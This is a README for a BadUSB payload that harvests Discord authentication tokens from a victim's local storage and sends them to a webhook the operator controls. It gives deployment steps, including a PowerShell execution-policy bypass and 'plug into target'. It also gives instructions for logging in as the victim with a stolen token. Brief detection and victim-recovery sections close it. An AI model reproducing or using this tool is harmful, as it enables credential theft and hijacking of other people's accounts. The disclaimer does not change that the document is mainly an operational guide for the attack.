```
▄▄▄▄▄▄    ▄▄▄▄▄▄     ▄▄▄▄▄▄  
▄▀   ░  ▀▄ █     ▀▀▄  ▄▀   ░  ▀▄ ▄▀   ░  ▀▄
█ ░▄▀▀▄ ░░ █ ░█▀▄   ▒ █ ░▄▀▀▄ ░░ █ ░▄▀▀▄ ░░
█ ░▒  █░ ▒ █▒░█  █░ ▓ █ ░▒  █▄▀  █ ░▒  █░ ▒
█░░▓  █░░▓ █▒▒▒▄▀░▒░█ █░░▓▄ ▀    █░░▓  █░░▓
█▒░█  █▒▒█ █▒▒▒░░▒▄▀  █▒░▒▒▀▄    █▒░█  █▒▒█
█▒▓▓  ▓▓▓█ █▒▓█▀▄▒▒█  █▒▓▓▀▀▀    █▒▓▓  ▓▓▓█
█▓▓▒  ▒█▓▓ █▓▓█ █▓▒█  █▓▓▒  ▒▄▄  █▓▓▒  ▒█▓▓
██▓░  ░██▒ ▒███ ▒▓██  ██▓░  ░██▒ ██▓░  ░██▒
█ █▀▄▄▀██░ ░██▓ ░██▓  █ █▀▄▄▀██░ █ █▀▄▄▀██░
▀▄      ▄  ▀▄█▒ ▀▄█▒  ▀▄      ▄  ▀▄      ▄ 
  ▀▀▀▀▀▀     ▀░   ▀░    ▀▀▀▀▀▀     ▀▀▀▀▀▀  
```

# 🔑 Discord Token Extractor

A BadUSB payload that extracts Discord authentication tokens from local storage and sends them to a Discord webhook.

## ⚠️ Legal Warning

**For authorized penetration testing and educational use only.** Unauthorized use:
- Violates Discord's Terms of Service
- May violate computer fraud laws (CFAA, CMA, etc.)
- Could result in account bans and legal action

You are responsible for your own actions.

## 📋 Description

Discord stores authentication tokens locally in the `leveldb` folder. This payload:
1. Searches for token patterns in Discord's LevelDB files
2. Extracts any tokens found
3. Sends them to a Discord webhook
4. Includes a verification link (Discord API `/users/@me`)

## Token Format

Discord tokens look like:
```
[24 chars].[6 chars].[27 chars]
Example: MTAxMjM0NTY3ODkwMTIzNDU2.Gabcdef.1234567890abcdefghijklmnopqrstuvwxyz
```

## Requirements

- Windows 10/11
- PowerShell 5+
- Discord desktop app installed (Classic, Canary, or PTB)
- User must be logged into Discord
- Discord webhook URL

## Setup

1. Create Discord webhook (Server Settings → Integrations)
2. Replace `YOUR_DISCORD_WEBHOOK_URL` with your URL
3. **Never commit real webhook to git**

## Deployment

**CMD (as Admin):**
```batch
powershell -NoProfile -ExecutionPolicy Bypass -Command "[paste payload]"
```

**Rubber Ducky:**
1. Encode `payload.txt` at https://hak5.github.io/usbrubberducky-payloads/
2. Copy `inject.bin` to Ducky
3. Plug into target

## What You'll Receive

For each token found, a Discord message:
```
Token: MTAxMjM0NTY3ODkwMTIzNDU2.Gabcdef.1234567890abcdefghijklmnopqrstuvwxyz
User check: https://discord.com/api/v9/users/@me
```

You can verify the token is valid via the URL. To use the token:
1. Open Discord in browser
2. F12 → Application → Local Storage → Add key `token` with the value
3. Refresh — you're now logged in as that user

## Detection

Defenders should monitor for:
- File reads from `%APPDATA%\Discord\Local Storage\leveldb`
- PowerShell regex matches of token pattern
- Outbound connections to Discord API
- Use of `Invoke-RestMethod` to unrelated webhooks

## Limitations

- Tokens may be encrypted (newer Discord versions)
- Encrypted tokens require the user's local encryption key
- Empty/non-existent Discord install = no tokens found

## 🛑 Reporting

If your tokens are stolen, immediately:
1. Change Discord password
2. Enable 2FA
3. Use Discord's "Log out all sessions"

## License

MIT — use at your own risk.
